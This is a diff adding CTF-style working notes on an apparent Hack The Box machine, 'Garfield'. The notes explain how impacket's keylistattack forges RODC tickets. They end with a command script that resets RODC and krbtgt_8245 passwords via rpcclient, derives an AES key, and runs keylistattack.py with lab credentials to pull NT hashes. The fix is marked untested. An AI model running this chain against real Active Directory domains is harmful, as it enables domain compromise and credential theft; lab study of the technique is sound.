@@ -420,3 +420,36 @@ The box is called Garfield. We used the scriptPath trick (Garfield connection: G
 2. Try secretsdump -rodcNo with explicit DN instead of username
 3. Try pass-the-ticket with RODC01$ Admin ticket against DC01
 4. Research: how does impacket's -rodcNo flag actually work? What DN does it use?
+
+## 00:05 — Source code analysis of keylistattack.py
+
+### How keylistattack works (from impacket source):
+1. getAllowedUsersToReplicate() — enumerates users via SAMR from Allowed RODC PRG
+2. createPartialTGT() — forges a TGT encrypted with rodcKey, kvno = rodcNo << 16
+3. getFullTGT() — sends TGS-REQ with KERB_KEY_LIST_REQ padata
+4. DC decrypts partial TGT with krbtgt_8245's AES key
+5. If decryption succeeds, DC returns full TGT with user's NT hash in key list
+
+### Why it returns empty:
+The AES key we provide doesn't match what AD stored for krbtgt_8245.
+After rpcclient setuserinfo2, AD derives AES keys server-side.
+The salt AD uses determines the key. For krbtgt: salt = <REALM>krbtgt
+
+### THE FIX (untested, box died):
+Password: NewKrb1!
+Salt: GARFIELD.HTBkrbtgt (NOT GARFIELD.HTBkrbtgt_8245)
+AES256: 8de6f7578fd335e0a536f7b1b5747dc705b7aeda5ed6df34c3ab94f63b768a37
+
+### Script for next instance:
+```
+export PATH=/home/hacker/.local/bin:$PATH
+# 1. Replay to l.wilson_adm (run pwn.sh steps 1-3)
+# 2. Change RODC01$ password
+rpcclient -U 'l.wilson_adm%P@ssw0rd2026!' $TARGET -c 'setuserinfo2 RODC01$ 23 NewRodc1!'
+# 3. Change krbtgt_8245 password  
+rpcclient -U 'RODC01$%NewRodc1!' $TARGET -c 'setuserinfo2 krbtgt_8245 23 NewKrb1!'
+# 4. Compute AES with STANDARD krbtgt salt (no suffix)
+AES=$(python3 -c "from impacket.krb5.crypto import string_to_key; from impacket.krb5.constants import EncryptionTypes; print(string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, 'NewKrb1!', 'GARFIELD.HTBkrbtgt').contents.hex())")
+# 5. Run keylistattack
+faketime '+8 hours' keylistattack.py "garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@DC01.garfield.htb" -rodcNo 8245 -rodcKey "$AES" -dc-ip $TARGET -full
+```
